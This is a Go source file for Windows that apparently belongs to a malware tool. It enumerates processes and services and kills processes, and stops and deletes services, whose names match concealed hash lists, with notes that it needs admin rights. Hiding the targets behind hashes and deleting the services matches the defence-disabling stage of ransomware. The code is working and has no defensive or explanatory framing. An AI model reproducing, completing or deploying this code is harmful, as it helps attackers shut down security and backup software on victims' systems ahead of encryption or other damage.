package main

import (
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc/mgr"
)

const TH32CS_SNAPPROCESS = 0x00000002

// use with admin priviledge
func killTargetProcesses(processes []WindowsProcess, processHashList []uint32) (err error) {

	hashMap := make(map[uint32]bool, len(processHashList))
	for _, hash := range processHashList {
		hashMap[hash] = true
	}

	for _, process := range processes {
		processHash := bufferHashing([]byte(strings.ToLower(strings.ReplaceAll(process.Exe, ".exe", ""))))
		if hashMap[processHash] {
			// kill process
			procHandle, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, uint32(process.ProcessID))

			if err != nil {
				return err
			}

			defer windows.CloseHandle(procHandle)

			err = windows.TerminateProcess(procHandle, 1)
		}
	}
	return nil
}

type WindowsProcess struct {
	ProcessID       int
	ParentProcessID int
	Exe             string
}

func getProcesses() ([]WindowsProcess, error) {
	snapshotHandle, err := windows.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)

	if err != nil {
		return nil, err
	}

	defer windows.CloseHandle(snapshotHandle)

	var procEntry windows.ProcessEntry32

	procEntry.Size = uint32(unsafe.Sizeof(procEntry))

	// proc first

	err = windows.Process32First(snapshotHandle, &procEntry)

	if err != nil {
		return nil, err
	}

	processLists := make([]WindowsProcess, 0, 50)

	for {
		processLists = append(processLists, newWindowsProcess(&procEntry))

		err = windows.Process32Next(snapshotHandle, &procEntry)
		if err != nil {
			if err == syscall.ERROR_NO_MORE_FILES {
				return processLists, nil
			}
			return nil, err
		}
	}
}

func newWindowsProcess(e *windows.ProcessEntry32) WindowsProcess {
	// Find when the string ends for decoding
	end := 0
	for {
		if e.ExeFile[end] == 0 {
			break
		}
		end++
	}

	return WindowsProcess{
		ProcessID:       int(e.ProcessID),
		ParentProcessID: int(e.ParentProcessID),
		Exe:             syscall.UTF16ToString(e.ExeFile[:end]),
	}
}

// Terminate services
//Requires Admin
func killTargetServices(serviceHashList []uint32) (err error) {
	SCManager, err := mgr.ConnectRemote("")
	if err != nil {
		return err
	}

	defer SCManager.Disconnect()

	hashMap := make(map[uint32]bool, len(serviceHashList))
	for _, hash := range serviceHashList {
		hashMap[hash] = true
	}

	serviceList, err := SCManager.ListServices()
	if err != nil {
		return err
	}

	for _, serviceName := range serviceList {
		serviceHash := bufferHashing([]byte(strings.ToLower(serviceName)))
		if hashMap[serviceHash] {
			// kill service
			service, err := SCManager.OpenService(serviceName)
			if err != nil {
				continue
			}
			stopped := false
			_, err = service.Control(windows.SERVICE_CONTROL_STOP)
			if err != nil {
				continue
			}

			for {
				service_status, err := service.Query()
				if err != nil {
					break
				}
				if uint32(service_status.State) == uint32(windows.SERVICE_STOPPED) {
					stopped = true
					break
				}
				time.Sleep(time.Millisecond * 500)
			}
			if stopped {
				service.Delete()
				service.Close()
			}

		}
	}
	return nil
}
